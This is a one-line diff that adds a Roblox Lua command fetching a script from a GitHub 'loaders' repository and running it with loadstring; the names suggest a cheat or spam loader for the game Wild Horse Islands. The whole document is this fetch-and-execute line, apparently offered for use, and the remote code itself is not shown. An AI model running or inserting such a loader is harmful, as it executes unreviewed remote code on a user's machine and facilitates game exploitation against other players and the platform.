@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/wild-horse-islands-spam6-6jp0os2sjrttbe.lua"))()
